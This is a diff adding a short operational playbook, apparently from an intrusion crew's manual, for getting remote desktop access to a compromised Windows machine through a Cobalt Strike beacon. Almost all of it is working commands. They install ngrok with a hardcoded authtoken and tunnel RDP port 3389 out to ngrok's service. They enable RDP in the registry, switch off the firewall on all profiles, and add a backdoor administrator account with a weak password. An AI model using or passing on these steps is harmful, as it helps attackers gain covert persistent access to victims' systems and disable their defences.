@@ -1,0 +1,28 @@
+ Sign up at https://ngrok.com/
+- Download ngrok.exe and load it on the car
+
+In the menu of the ngrok account panel, select "Your Authtoken".
+Copy the command with the token (without ./). For example:
+ngrok authtoken 1vZgA1BbLWyhSjjIE0f36QG6derd_5fXEPgPp8ZLxbUg
+
+- Go into the cobalt on the car and write:
+shell ngrok authtoken 1vZgA1BbLWyhSjjIE0f36QG6derd_5fXEPgPp8ZLxbUg
+
+- Tunnel to the RDP port:
+shell ngrok tcp 3389
+
+- Open RDP on the machine:
+shell reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f && reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
+
+shell netsh advfirewall set allprofiles state off
+
+shell netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
+
+shell netsh firewall set service type = remote desktop mode = enable
+
+- We can add a separate user under ngrok:
+shell net user Admin Password1 /add
+shell net localgroup Administrators Admin /add
+
+- Go into ngrok account panel - check the tunnel ("Endpoints - Status").
+Copy IP:port from there and go to any RDP client. Connect (we can do it with the account we created).
